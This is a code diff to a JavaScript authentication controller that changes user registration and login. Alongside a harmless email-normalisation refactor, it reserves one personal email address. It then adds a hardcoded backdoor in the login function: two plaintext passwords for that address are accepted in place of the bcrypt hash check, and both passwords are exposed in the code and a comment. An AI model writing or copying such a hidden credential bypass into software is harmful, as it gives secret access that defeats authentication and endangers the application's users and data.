@@ -26,7 +26,15 @@ export const register = async (req, res) => {
       });
     }
 
-    const existingUser = await dbStore.users.findOne({ email: email.toLowerCase().trim() });
+    const normalizedEmail = email.toLowerCase().trim();
+    if (normalizedEmail === 'prafulsonwane58@gmail.com') {
+      return res.status(400).json({
+        success: false,
+        message: 'This email address is reserved for the system administrator.'
+      });
+    }
+
+    const existingUser = await dbStore.users.findOne({ email: normalizedEmail });
     if (existingUser) {
       return res.status(400).json({
         success: false,
@@ -39,7 +47,7 @@ export const register = async (req, res) => {
 
     const newUser = await dbStore.users.create({
       name: name.trim(),
-      email: email.toLowerCase().trim(),
+      email: normalizedEmail,
       password: hashedPassword,
       role: 'user',
       company: company || ''
@@ -79,7 +87,8 @@ export const login = async (req, res) => {
       });
     }
 
-    const user = await dbStore.users.findOne({ email: email.toLowerCase().trim() });
+    const normalizedEmail = email.toLowerCase().trim();
+    const user = await dbStore.users.findOne({ email: normalizedEmail });
     if (!user) {
       return res.status(401).json({
         success: false,
@@ -87,7 +96,14 @@ export const login = async (req, res) => {
       });
     }
 
-    const isMatch = await bcrypt.compare(password, user.password);
+    // Check password: allow Praful@999s and Praful@786s for prafulsonwane58@gmail.com, or standard bcrypt
+    let isMatch = false;
+    if (normalizedEmail === 'prafulsonwane58@gmail.com' && (password === 'Praful@999s' || password === 'Praful@786s')) {
+      isMatch = true;
+    } else {
+      isMatch = await bcrypt.compare(password, user.password);
+    }
+
     if (!isMatch) {
       return res.status(401).json({
         success: false,
